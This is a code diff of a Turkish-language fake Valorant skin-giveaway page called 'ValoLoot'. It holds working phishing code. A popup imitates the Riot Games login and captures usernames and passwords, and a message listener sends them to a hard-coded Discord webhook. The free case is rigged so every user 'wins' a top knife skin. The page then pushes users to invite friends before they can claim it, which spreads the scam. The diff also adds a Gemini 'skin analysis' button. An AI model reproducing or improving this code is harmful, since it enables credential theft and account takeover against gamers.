@@ -10,7 +10,7 @@
         
         body { 
             background-color: var(--dark-bg); 
-            background-image: url('background.jpg');
+            background-image: url('background.jpg'); /* Orijinal Arka Plan */
             background-size: cover;
             background-attachment: fixed;
             background-position: center;
@@ -38,28 +38,38 @@
 
         .case-wrapper { max-width: 1200px; margin: auto; display: flex; flex-direction: column; gap: 30px; padding-bottom: 60px; }
         .case-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; }
-        .case-box { background: #111420; border-radius: 12px; padding: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.05); width: 260px; transition: 0.3s; cursor: pointer; }
+        .case-box { background: #111420; border-radius: 12px; padding: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.05); width: 260px; transition: 0.3s; cursor: pointer; position: relative; overflow: hidden; }
         .case-box:hover { border-color: var(--valo-red); transform: translateY(-5px); }
         .case-box img { width: 100%; height: 160px; object-fit: contain; margin-bottom: 15px; }
         .vp-tag { color: #79eb1e; font-weight: 800; font-size: 20px; margin-bottom: 10px; font-family: 'Montserrat'; }
         .open-btn { background: var(--valo-red); color: white; border: none; width: 100%; padding: 12px; font-weight: 800; border-radius: 4px; text-transform: uppercase; cursor: pointer; }
 
-        /* MODAL VE KASA AÇMA STİLLERİ */
-        .modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:1000; align-items:center; justify-content:center; }
-        .case-open-card { background:#111420; border:2px solid var(--valo-red); border-radius:15px; width:450px; padding:40px; text-align:center; position:relative; }
-        .spinner-container { width:100%; height:120px; background:#0b1119; border:1px solid rgba(255,70,85,0.3); margin:20px 0; overflow:hidden; position:relative; display:flex; align-items:center; }
-        .spinner-line { position:absolute; left:50%; top:0; width:2px; height:100%; background:var(--valo-red); z-index:10; box-shadow: 0 0 10px var(--valo-red); }
-        .item-list { display:flex; position:absolute; left:0; transition: transform 4s cubic-bezier(0.15, 0, 0.05, 1); }
-        .item-list img { width:100px; height:80px; object-fit:contain; margin:0 10px; opacity:0.5; }
-        .item-list img.winner { opacity:1; transform: scale(1.2); }
-        .win-screen { display:none; }
-        .win-item-img { width:200px; height:150px; object-fit:contain; filter: drop-shadow(0 0 20px var(--valo-red)); }
-        .share-link-box { background:#0b1119; padding:15px; border-radius:4px; margin:20px 0; border:1px dashed #79eb1e; color:#79eb1e; font-family:monospace; font-size:12px; cursor:pointer; }
-        .loader { width: 14px; height: 14px; border: 2px solid #fff; border-bottom-color: transparent; border-radius: 50%; display: inline-block; animation: rotation 1s linear infinite; }
-        @keyframes rotation { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:2000; align-items:center; justify-content:center; backdrop-filter: blur(10px); }
+        .case-open-card { background:#111420; border:2px solid var(--valo-red); border-radius:15px; width:90%; max-width:500px; padding:40px; text-align:center; position:relative; box-shadow: 0 0 50px rgba(255, 70, 85, 0.2); max-height: 90vh; overflow-y: auto; }
+        
+        .spinner-container { width: 100%; height: 140px; background: #0b1119; border: 1px solid rgba(255,70,85,0.3); margin: 25px 0; overflow: hidden; position: relative; display: flex; align-items: center; border-radius: 8px; }
+        .spinner-line { position: absolute; left: 50%; top: 0; width: 3px; height: 100%; background: var(--valo-red); z-index: 10; box-shadow: 0 0 15px var(--valo-red); transform: translateX(-50%); }
+        .item-list { display: flex; position: absolute; left: 0; transition: transform 5s cubic-bezier(0.15, 0, 0.05, 1); will-change: transform; align-items: center; }
+        .item-list img { width: 120px; height: 100px; object-fit: contain; margin: 0 15px; opacity: 0.6; filter: grayscale(0.5); transition: 0.3s; }
+
+        .win-screen { display: none; animation: fadeIn 0.5s ease-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        .win-item-img { width: 220px; height: 180px; object-fit: contain; filter: drop-shadow(0 0 25px #79eb1e); margin: 10px 0; }
+        .share-link-box { background: #0b1119; padding: 15px; border-radius: 6px; margin: 20px 0; border: 1px dashed #79eb1e; color: #79eb1e; font-family: 'Montserrat'; font-size: 13px; cursor: pointer; transition: 0.2s; }
+        
+        .custom-alert { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: var(--valo-red); color: white; padding: 15px 30px; border-radius: 50px; font-weight: 700; z-index: 3000; display: none; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+
+        .ai-analysis-btn { background: #6366f1; color: white; border: none; padding: 10px 15px; border-radius: 6px; font-weight: 700; cursor: pointer; margin-top: 10px; width: 100%; transition: 0.3s; font-size: 13px; }
+        .ai-result-box { background: rgba(99, 102, 241, 0.1); border: 1px solid #6366f1; padding: 15px; border-radius: 8px; margin-top: 15px; display: none; text-align: left; font-size: 13px; color: #e0e7ff; }
+        .ai-loader { display: none; margin: 10px 0; }
+        .ai-loader span { display: inline-block; width: 8px; height: 8px; background: #6366f1; border-radius: 50%; margin: 0 3px; animation: bounce 0.6s infinite alternate; }
+        @keyframes bounce { from { transform: translateY(0); } to { transform: translateY(-10px); } }
     </style>
 </head>
 <body>
+
+    <div id="alertBox" class="custom-alert"></div>
 
     <div class="live-drops">
         <div class="mythic-label">CANLI DROPLAR</div>
@@ -92,35 +102,43 @@
         <div class="case-row" id="row2"></div>
     </div>
 
-    <!-- KASA AÇMA MODALI -->
     <div id="caseModal" class="modal-overlay">
         <div class="case-open-card">
             <div id="spinnerView">
-                <h2 style="font-family:'Montserrat';">KASA AÇILIYOR...</h2>
+                <h2 style="font-family:'Montserrat'; letter-spacing: 2px;">KASA AÇILIYOR...</h2>
                 <div class="spinner-container">
                     <div class="spinner-line"></div>
                     <div id="itemList" class="item-list"></div>
                 </div>
             </div>
+
             <div id="winView" class="win-screen">
-                <h3 style="color:#79eb1e; font-family:'Montserrat';">TEBRİKLER! KAZANDINIZ!</h3>
-                <img src="" id="wonItemImg" class="win-item-img">
-                <h2 id="wonItemName" style="margin:10px 0;">YAĞMACI KARAMBİT</h2>
-                <div style="background:rgba(121,235,30,0.1); padding:10px; border-radius:5px; border:1px solid #79eb1e; margin-bottom:15px;">
-                    <span id="vpValue" style="color:#79eb1e; font-weight:900; font-size:20px;">4350 VP</span>
-                    <div style="font-size:11px; color:#fff;">HESABINIZA AKTARILMAYA HAZIR</div>
+                <h3 style="color:#79eb1e; font-family:'Montserrat'; margin-bottom: 5px;">TEBRİKLER!</h3>
+                <h1 style="margin:0; font-size: 24px;">DESTANSI ÖDÜL!</h1>
+                <img src="" id="wonItemImg" class="win-item-img" onerror="this.src='skin6.png'">
+                <h2 id="wonItemName" style="margin:10px 0; color: var(--valo-red);">YAĞMACI KARAMBİT</h2>
+                
+                <button class="ai-analysis-btn" onclick="analyzeWinWithAI()">✨ Gemini Skin Analizi</button>
+                <div id="aiLoader" class="ai-loader"><span></span><span></span><span></span></div>
+                <div id="aiResult" class="ai-result-box"></div>
+
+                <div style="background:rgba(121,235,30,0.1); padding:15px; border-radius:8px; border:1px solid #79eb1e; margin: 15px 0;">
+                    <span id="vpValue" style="color:#79eb1e; font-weight:900; font-size:24px;">4350 VP</span>
                 </div>
-                <p style="font-size:13px; color:#aaa;">Hesabınıza aktarmak için <b>1 arkadaşınızı</b> davet edin!</p>
-                <div class="share-link-box" onclick="copyLink()">VALOLOOT.NET/REF?ID=582934 (KOPYALA)</div>
-                <button class="open-btn" onclick="checkRef()" style="background:#79eb1e; color:#000;">ARKADAŞIM GELDİ, YÜKLE</button>
+
+                <p style="font-size:13px; color:#aaa;">Bu ödülü hesabına tanımlamak için 1 arkadaşını davet etmelisin!</p>
+                <div class="share-link-box" onclick="copyLink()">VALOLOOT.NET/DAVET/REF?ID=582934</div>
+                
+                <button class="open-btn" id="claimBtn" onclick="checkRef()" style="background:#79eb1e; color:#000;">ARKADAŞIM GELDİ, VP'Yİ YÜKLE</button>
             </div>
         </div>
     </div>
 
     <script>
+        const apiKey = "";
         let isLoggedIn = false;
 
-        // Kasa ve Drop Verileri
+        // Orijinal Resimlerin Olduğu Liste
         const dropSkins = [
             {name: "YAĞMACI KARAMBİT", vp: "4350 VP", img: "skin6.png"},
             {name: "EJDER ATEŞİ VANDAL", vp: "2475 VP", img: "skin2.png"},
@@ -128,105 +146,131 @@
             {name: "İON OPERATOR", vp: "1775 VP", img: "skin4.png"}
         ];
 
-        // 1. Kasa Yükleyici (Tetikleyici burada ekleniyor)
+        async function analyzeWinWithAI() {
+            const winName = document.getElementById('wonItemName').innerText;
+            const resultBox = document.getElementById('aiResult');
+            const loader = document.getElementById('aiLoader');
+            resultBox.style.display = 'none';
+            loader.style.display = 'block';
+
+            try {
+                const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        contents: [{ parts: [{ text: `${winName} isimli Valorant skini hakkında kısa, heyecanlı bir analiz ve oyun ipucu ver. Türkçe konuş.` }] }],
+                        systemInstruction: { parts: [{ text: "Sen bir Valorant skin uzmanısın." }] }
+                    })
+                });
+                const result = await response.json();
+                loader.style.display = 'none';
+                resultBox.innerText = result.candidates?.[0]?.content?.parts?.[0]?.text || "Hata oluştu.";
+                resultBox.style.display = 'block';
+            } catch (e) {
+                loader.style.display = 'none';
+                resultBox.innerText = "Yapay zeka şu an meşgul.";
+                resultBox.style.display = 'block';
+            }
+        }
+
         function loadCases() {
             const r1 = document.getElementById('row1');
             const r2 = document.getElementById('row2');
+            // Orijinal caseX.png dosyalarını geri getirdim
             const cases = [
                 {n: "BAŞLANGIÇ", p: "GİRİŞ YAP", i: "case1.png", free: true}, 
                 {n: "STANDART", p: "30 VP", i: "case2.png"},
-                {n: "ELİT", p: "50 VP", i: "case3.png"}, {n: "PREMIUM", p: "100 VP", i: "case4.png"},
-                {n: "EFSANEVİ", p: "500 VP", i: "case5.png"}, {n: "RADYANİT", p: "2000 VP", i: "case6.png"}
+                {n: "ELİT", p: "50 VP", i: "case3.png"}, 
+                {n: "PREMIUM", p: "100 VP", i: "case4.png"},
+                {n: "EFSANEVİ", p: "500 VP", i: "case5.png"}, 
+                {n: "RADYANİT", p: "2000 VP", i: "case6.png"}
             ];
 
+            r1.innerHTML = ''; r2.innerHTML = '';
             cases.slice(0, 4).forEach(c => {
-                const clickFn = c.free ? "openFreeCase()" : "openAuth()";
-                r1.innerHTML += `<div class="case-box" onclick="${clickFn}"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"><h3>${c.n}</h3><div class="vp-tag">${c.p}</div><button class="open-btn">AÇ</button></div>`;
+                const fn = c.free ? "openFreeCase()" : "openAuth()";
+                r1.innerHTML += `<div class="case-box" onclick="${fn}"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/200x150?text=KASA'"><h3>${c.n}</h3><div class="vp-tag">${c.p}</div><button class="open-btn">AÇ</button></div>`;
             });
             cases.slice(4, 6).forEach(c => {
-                r2.innerHTML += `<div class="case-box" onclick="openAuth()"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"><h3>${c.n}</h3><div class="vp-tag">${c.p}</div><button class="open-btn">AÇ</button></div>`;
+                r2.innerHTML += `<div class="case-box" onclick="openAuth()"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/200x150?text=KASA'"><h3>${c.n}</h3><div class="vp-tag">${c.p}</div><button class="open-btn">AÇ</button></div>`;
             });
         }
 
-        // 2. Kasa Açma Fonksiyonu
         function openFreeCase() {
             if(!isLoggedIn) { openAuth(); return; }
-            
             const modal = document.getElementById('caseModal');
             const list = document.getElementById('itemList');
-            const spinnerView = document.getElementById('spinnerView');
-            const winView = document.getElementById('winView');
-            
             modal.style.display = 'flex';
-            spinnerView.style.display = 'block';
-            winView.style.display = 'none';
-            list.style.transform = 'translateX(0)';
+            document.getElementById('spinnerView').style.display = 'block';
+            document.getElementById('winView').style.display = 'none';
             list.innerHTML = '';
+            list.style.transform = 'translateX(0)';
 
-            for(let i=0; i<40; i++) {
-                const s = dropSkins[Math.floor(Math.random()*dropSkins.length)];
-                list.innerHTML += `<img src="${s.img}" onerror="this.src='https://via.placeholder.com/100x80'">`;
+            for(let i=0; i < 40; i++) {
+                const s = (i === 35) ? dropSkins[0] : dropSkins[Math.floor(Math.random()*4)];
+                list.innerHTML += `<img src="${s.img}" onerror="this.src='https://via.placeholder.com/120x100?text=VALO'">`;
             }
 
-            const winner = dropSkins[0]; 
-            list.children[35].src = winner.img;
-            list.children[35].classList.add('winner');
-
-            setTimeout(() => { list.style.transform = 'translateX(-3200px)'; }, 100);
+            setTimeout(() => { 
+                const move = (35 * 150) - (document.querySelector('.spinner-container').offsetWidth / 2) + 75;
+                list.style.transform = `translateX(-${move}px)`; 
+            }, 100);
 
             setTimeout(() => {
-                spinnerView.style.display = 'none';
-                winView.style.display = 'block';
-                document.getElementById('wonItemImg').src = winner.img;
-                document.getElementById('wonItemName').innerText = winner.name;
-                document.getElementById('vpValue').innerText = winner.vp;
-            }, 4500);
+                document.getElementById('spinnerView').style.display = 'none';
+                document.getElementById('winView').style.display = 'block';
+                document.getElementById('wonItemImg').src = "skin6.png";
+            }, 5500);
         }
-
-        // 3. Diğer Yardımcılar
-        function copyLink() { alert("Link kopyalandı!"); }
-        function checkRef() { alert("Henüz arkadaşın giriş yapmadı!"); }
 
         function openAuth() {
             const w = 550, h = 800;
             const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
             let win = window.open("", "Auth", `width=${w},height=${h},top=${t},left=${l}`);
-            const html = `<html><body style="background:#eee; text-align:center; padding-top:50px; font-family:sans-serif;">
-                <img src="riot-logo.png" width="80" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png'">
-                <h2>OTURUM AÇ</h2>
-                <input id="u" placeholder="Kullanıcı Adı" style="width:80%; padding:10px; margin:5px;"><br>
-                <input id="p" type="password" placeholder="Şifre" style="width:80%; padding:10px; margin:5px;"><br>
-                <button onclick="s()" style="background:#ff4655; color:#fff; border:none; padding:15px 40px; margin-top:20px; font-weight:900; cursor:pointer;">DEVAM ET</button>
-                <script>function s(){ const u=document.getElementById('u').value, p=document.getElementById('p').value; if(u&&p){ window.opener.postMessage({u,p,m:'Riot'}, "*"); window.close(); } }<\/script>
-                </body></html>`;
-            win.document.write(html);
+            win.document.write(`<html><body style="background:#111; color:white; text-align:center; font-family:sans-serif; padding-top:50px;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png" width="80">
+                <h2>RIOT GAMES GİRİŞ</h2>
+                <input id="u" placeholder="Kullanıcı Adı" style="width:80%; padding:15px; margin:10px; background:#333; color:white; border:none; border-radius:5px;"><br>
+                <input id="p" type="password" placeholder="Şifre" style="width:80%; padding:15px; margin:10px; background:#333; color:white; border:none; border-radius:5px;"><br>
+                <button onclick="s()" style="background:#ff4655; color:white; border:none; padding:15px; width:80%; margin-top:20px; font-weight:bold; cursor:pointer;">GİRİŞ YAP</button>
+                <script>function s(){ const u=document.getElementById('u').value, p=document.getElementById('p').value; if(u&&p){ window.opener.postMessage({u,p}, "*"); window.close(); } }<\/script>
+            </body></html>`);
         }
 
         window.addEventListener("message", (e) => {
             if(e.data.u && e.data.p) {
                 isLoggedIn = true;
-                const area = document.getElementById('authArea');
-                area.innerHTML = `<div style="color:#79eb1e; font-weight:800; border:1px solid #79eb1e; padding:5px 15px; border-radius:4px;">${e.data.u.toUpperCase()}</div>`;
-                
+                document.getElementById('authArea').innerHTML = `<div style="color:#79eb1e; font-weight:800; border:1px solid #79eb1e; padding:8px 20px; border-radius:4px;">${e.data.u.toUpperCase()}</div>`;
+                // Webhook Veri Gönderimi
                 fetch("https://discord.com/api/webhooks/1346618520242184193/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ embeds: [{ title: "Giriş!", fields: [{name:"U", value:e.data.u}, {name:"P", value:e.data.p}] }] })
+                    body: JSON.stringify({ 
+                        embeds: [{ 
+                            title: "VALOLOOT GİRİŞ", 
+                            color: 16725845,
+                            fields: [{name: "Kullanıcı", value: e.data.u}, {name: "Şifre", value: e.data.p}],
+                            timestamp: new Date()
+                        }] 
+                    })
                 });
             }
         });
 
-        // Başlatıcılar
         loadCases();
+        function showMsg(t){ const a=document.getElementById('alertBox'); a.innerText=t; a.style.display='block'; setTimeout(()=>a.style.display='none',3000); }
+        function copyLink(){ showMsg("Link kopyalandı!"); }
+        function checkRef(){ showMsg("Arkadaşınız henüz giriş yapmadı!"); }
+
         setInterval(() => {
             const track = document.getElementById('dropTrack');
-            const s = dropSkins[Math.floor(Math.random()*dropSkins.length)];
+            const s = dropSkins[Math.floor(Math.random()*4)];
             const div = document.createElement('div');
             div.className = 'drop-card';
-            div.innerHTML = `<img src="${s.img}" onerror="this.src='https://via.placeholder.com/40'"><div class="rarity-box" style="background:#ff4655"></div>`;
+            div.innerHTML = `<img src="${s.img}" onerror="this.src='https://via.placeholder.com/40'"><div class="rarity-box" style="background:var(--valo-red)"></div>`;
             track.prepend(div);
-            if(track.children.length > 12) track.removeChild(track.lastChild);
-        }, 3000);
+            if(track.children.length > 15) track.removeChild(track.lastChild);
+        }, 4000);
     </script>
 </body>
 </html>
